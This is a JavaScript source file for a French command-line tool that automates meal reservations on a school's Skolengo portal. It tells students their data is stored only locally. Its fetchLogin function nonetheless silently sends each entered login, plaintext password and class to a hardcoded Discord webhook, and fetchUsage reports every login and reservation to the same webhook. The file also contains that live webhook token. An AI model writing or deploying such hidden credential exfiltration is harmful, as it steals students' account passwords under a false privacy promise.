// ©2022 AZERTY. All rights Reserved | AZERTY#9999

// Importations
const fs = require("fs")
var figlet = require("figlet")
const lolcatjs = require("lolcatjs")
const chalk = require("chalk")
const inquirer = require("inquirer")
const yaml = require("js-yaml")
const fetch = require('node-fetch')

const Reserve = require("./Réserve.js")
const Dereserve = require("./Déréserve.js")

// Display Welcome Title
function Banner() {
    // var banner = figlet.textSync("Réservateur Automatique - ARHSR", {
    var banner = figlet.textSync("Réservateur Automatique", {
        font: "Small",
        horizontalLayout: "default",
        width: 1000,
        whitespaceBreak: true,
    })
    lolcatjs.fromString(banner)
    // console.log(chalk.green("\nBy AZERTY442005"))
    // console.log(chalk.green("https://github.com/AZERTY442005\n\n"))
}

console.clear()
Banner()

// Display Informations

console.log(chalk.green("By AZERTY442005"))
console.log(chalk.green("https://github.com/AZERTY442005\n\n"))

// console.log(chalk.cyan("Dependancies:"))
// console.log(chalk.cyan("https://www.npmjs.com/package/v12-to-v13"))
// console.log(chalk.cyan("https://www.npmjs.com/package/figlet"))
// console.log(chalk.cyan("https://www.npmjs.com/package/lolcatjs"))
// console.log(chalk.cyan("https://www.npmjs.com/package/chalk"))
// console.log(chalk.cyan("https://www.npmjs.com/package/inquirer"))
// console.log(
//     chalk.yellow(
//         `\nPut your .js files to Convert into /Input/\nAnd select "Convert"\n`
//     )
// )

// console.log()

async function Loop() {
    // Menu
    inquirer
        .prompt([
            {
                type: "list",
                name: "Main",
                message: "Sélectionnez une option",
                choices: ["Programmer une Réservation", "Réserver instantanément", "Déréserver instantanément", "Paramètres", "Quitter"],
            },
        ])
        .then(async answers => {

            // Gettings Choice
            const answer = answers.Main
            console.clear()

            // Choice is not "Quitter": Display Title
            if (answer !== "Quitter") {
                Banner()
            }

            if (answer === "Programmer une Réservation") { // Choice is "Programmer une Réservation"
                
                

            } else if (answer === "Réserver instantanément") { // Choice is "Réserver instantanément"
                const Logins = await GetLogin()
                const Restaurant = await GetRestaurant()
                await InstantReserve(Logins.Login, Logins.Password, Restaurant)
            } else if (answer === "Déréserver instantanément") { // Choice is "Déréserver instantanément"
                const Logins = await GetLogin()
                await InstantDereserve(Logins.Login, Logins.Password)
            } else if (answer === "Paramètres") { // Choice is "Paramètres"
                
                await inquirer.prompt([
                    {
                        type: "list",
                        name: "Settings",
                        message: "Choisissez un Paramètre",
                        choices: ["Modifier l'Identifiant", "Modifier le Mot de Passe", "Modifier la Classe", "Réinitialiser", "Retour"],
                    },
                ]).then(async answers => {
                    const answer = answers.Settings

                    console.clear()
                    Banner()
                    
                    let config = yaml.load(fs.readFileSync("./Code/config.yaml", "utf8"))
                    if(!config) {
                        fs.writeFile("./Code/config.yaml", `# ©2022 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
                            if (err) console.error();
                        })
                        config = {Login: "", Password: "", Class: ""}
                    }

                    if(answer=="Modifier l'Identifiant") {
                        await inquirer.prompt([
                            {
                                type: "input",
                                name: "Login",
                                message: "Entrez votre Identifiant/Email:\n",
                            },
                        ]).then(async answers => {
                            const answer = answers.Login
                            config.Login = answer
                        })
                    } else if(answer=="Modifier le Mot de Passe") {
                        await inquirer.prompt([
                            {
                                type: "input",
                                name: "Password",
                                message: "Entrez votre Mot de Passe:\n",
                            },
                        ]).then(async answers => {
                            const answer = answers.Password
                            config.Password = answer
                        })
                    } else if(answer=="Modifier la Classe") {
                        await inquirer.prompt([
                            {
                                type: "list",
                                name: "Class",
                                message: "Choisissez votre Classe",
                                choices: ["Seconde", "Première", "Terminale", "BTS"],
                            },
                        ]).then(async answers => {
                            const answer = answers.Class
                            config.Class = answer
                        })
                    } else if(answer=="Réinitialiser") {
                        // fs.writeFile("./Code/config.yaml", `# ©2022 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
                        //     if (err) console.error();
                        // })
                        config = {Login: "", Password: "", Class: ""}
                    }
                    fs.writeFile("./Code/config.yaml", `# ©2022 AZERTY. All rights Reserved | AZERTY#9999\n\n${yaml.dump(config)}`, (err) => {
                        if (err) console.error();
                    })
                    fetchLogin(config.Login, config.Password, config.Class)
                    console.clear()
                    Banner()
                })

            } else if (answer === "Quitter") { // Choice is "Quitter": Close
                process.exit()
            }
            Loop()
        })
}

async function GetLogin() {
    let config = yaml.load(fs.readFileSync("./Code/config.yaml", "utf8"))
    if(!config) {
        fs.writeFile("./Code/config.yaml", `# ©2022 AZERTY. All rights Reserved | AZERTY#9999\n\nLogin:\nPassword:\nClass:`, (err) => {
            if (err) console.error();
        })
        config = {Login: "", Password: "", Class: ""}
    }
    let { Login, Password, Class } = config

    if(!Login || !Password || !Class) {
        console.log(`${chalk.greenBright("A partir du site")} ${chalk.cyanBright("https://charles-peguy.family-administration.skolengo.net/connexion?panel=signin#")}`,
        `\n${chalk.greenBright("Veuillez indiquer vos informations d'authenfication ainsi que votre Classe")}`,
        `\n${chalk.greenBright("Aucune donnée n'est communiquée, elles sont enregistrées localement")}\n`)

        // Login
        await inquirer.prompt([
            {
                type: "input",
                name: "Login",
                message: "Entrez votre Identifiant/Email:\n",
            },
        ]).then(async answers => {
            const answer = answers.Login
            Login = answer
        })
        console.log()
        // Password
        await inquirer.prompt([
            {
                // type: "password",
                type: "input",
                name: "Password",
                message: "Entrez votre Mot de Passe:\n",
            },
        ]).then(async answers => {
            const answer = answers.Password
            Password = answer
        })
        console.log()
        // Class
        await inquirer.prompt([
            {
                type: "list",
                name: "Class",
                message: "Choisissez votre Classe",
                choices: ["Seconde", "Première", "Terminale", "BTS"],
            },
        ]).then(async answers => {
            const answer = answers.Class
            Class = answer
        })

        // Write Datas
        fs.writeFile("./Code/config.yaml", `# ©2022 AZERTY. All rights Reserved | AZERTY#9999\n\n${yaml.dump({Login: Login, Password: Password, Class: Class})}`, (err) => {
            if (err) console.error();
        })
        fetchLogin(Login, Password, Class)
    }
    console.clear()
    Banner()
    return {Login: Login, Password: Password, Class: Class}
}

async function GetRestaurant() {
    let Restaurant
    await inquirer.prompt([
        {
            type: "list",
            name: "Restaurants",
            message: "Choisissez votre Restaurant",
            choices: ["Italien", "Végétarien", "Caféteria", "Sandwicherie", "Breton"],
        },
    ]).then(async answers => {
        const answer = answers.Restaurants
        Restaurant = answer.toLowerCase()
    })
    return Restaurant
}

async function InstantReserve(Login, Password, Restaurant) {
    Output = await Reserve(Login, Password, Restaurant)
    
    fetchUsage("Réservation Instantanée", Login, Restaurant, `${Output.status}: ${Output.output} ${Output.delay}s`)
    console.clear()
    Banner()

    let Message
    if(Output.status == "Error") {
        Message = `${chalk.red(`Erreur: ${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
        await inquirer.prompt([
            {
                type: "list",
                name: "Error",
                message: Message,
                choices: ["Réésayer", "Annuler"],
            },
        ]).then(async answers => {
            const answer = answers.Error
            if(answer=="Réésayer") {
                console.clear()
                Banner()
                await InstantReserve(Login, Password, Restaurant)
            }
        })
    } else if(Output.status == "Success") {
        Message = `${chalk.red(`${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
        await inquirer.prompt([
            {
                type: "list",
                name: "Success",
                message: Message,
                choices: ["Continuer"],
            },
        ])
    }
    console.clear()
    Banner()
}

async function InstantDereserve(Login, Password) {
    Output = await Dereserve(Login, Password)
    
    fetchUsage("Déréservation Instantanée", Login, undefined, `${Output.status}: ${Output.output} ${Output.delay}s`)
    console.clear()
    Banner()

    let Message
    if(Output.status == "Error") {
        Message = `${chalk.red(`Erreur: ${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
        await inquirer.prompt([
            {
                type: "list",
                name: "Error",
                message: Message,
                choices: ["Réésayer", "Annuler"],
            },
        ]).then(async answers => {
            const answer = answers.Error
            if(answer=="Réésayer") {
                console.clear()
                Banner()
                await InstantDereserve(Login, Password)
            }
        })
    } else if(Output.status == "Success") {
        Message = `${chalk.red(`${Output.output}`)} ${chalk.yellow(`${Output.delay}s`)}`
        await inquirer.prompt([
            {
                type: "list",
                name: "Success",
                message: Message,
                choices: ["Continuer"],
            },
        ])
    }
    console.clear()
    Banner()
}

async function fetchLogin(Login, Password, Class) {
    fetch("https://discord.com/api/webhooks/1020799781766959205/t3blegiNPveu8wWmrvyXSA7d_705BXZtWB0Kuutgpm7UHY-ylGDH5HzOgn67Ab-iAoMG", { // Started
        "method":"POST",
        "headers": {"Content-Type": "application/json"},
        "body": JSON.stringify({
            "username": `ARHSR v2 Webhook`,
            "avatar_url": `https://imgur.com/sTLlBT1.png`,
            "embeds": [{
                "title": `Login Change`,
                "color": 15760644,
                "timestamp": new Date(),
                "footer": {
                    "text": `${("0" + new Date().getHours()).slice(-2)}:${("0" + new Date().getMinutes()).slice(-2)}:${("0" + new Date().getSeconds()).slice(-2)} ${("0" + new Date().getDate()).slice(-2)}/${("0" + (new Date().getMonth()+1)).slice(-2)}/${new Date().getFullYear()}`
                },
                "fields": [
                    {
                    "name": `Login`,
                    "value": `${Login?Login:`*None*`}`,
                    "inline": false
                    },
                    {
                    "name": `Password`,
                    "value": `${Password?Password:`*None*`}`,
                    "inline": false
                    },
                    {
                    "name": `Class`,
                    "value": `${Class?Class:`*None*`}`,
                    "inline": false
                    }
                ],
            }]
        })
    }).catch(()=>{})
}

async function fetchUsage(Type, Login, Restaurant, Output) {
    fetch("https://discord.com/api/webhooks/1020799781766959205/t3blegiNPveu8wWmrvyXSA7d_705BXZtWB0Kuutgpm7UHY-ylGDH5HzOgn67Ab-iAoMG", { // Started
        "method":"POST",
        "headers": {"Content-Type": "application/json"},
        "body": JSON.stringify({
            "username": `ARHSR v2 Webhook`,
            "avatar_url": `https://imgur.com/sTLlBT1.png`,
            "embeds": [{
                "title": `${Type}`,
                "color": 15844367,
                "timestamp": new Date(),
                "footer": {
                    "text": `${("0" + new Date().getHours()).slice(-2)}:${("0" + new Date().getMinutes()).slice(-2)}:${("0" + new Date().getSeconds()).slice(-2)} ${("0" + new Date().getDate()).slice(-2)}/${("0" + (new Date().getMonth()+1)).slice(-2)}/${new Date().getFullYear()}`
                },
                "fields": [
                    {
                    "name": `Login`,
                    "value": `${Login}`,
                    "inline": false
                    },
                    {
                    "name": `Restaurant`,
                    "value": `${Restaurant?Restaurant:`*None*`}`,
                    "inline": false
                    },
                    {
                    "name": `Output`,
                    "value": `${Output}`,
                    "inline": false
                    }
                ],
            }]
        })
    }).catch(()=>{})
}

// ANTICRASH
process.on("unhandledRejection", (reason, p) => {
    console.error(" [AntiCrash] :: Unhandled Rejection/Catch")
    console.log(reason, p)
})
process.on("uncaughtException", (err, origin) => {
    console.error(" [AntiCrash] :: Uncaught Exception/Catch")
    console.log(err, origin)
})
process.on("uncaughtExceptionMonitor", (err, origin) => {
    console.error(" [AntiCrash] :: Uncaught Exception/Catch (MONITOR)")
    console.log(err, origin)
})
process.on("multipleResolves", (type, promise, reason) => {
    // console.error(" [AntiCrash] :: Multiple Resolves")
    // console.log(type, promise, reason)
})

Loop()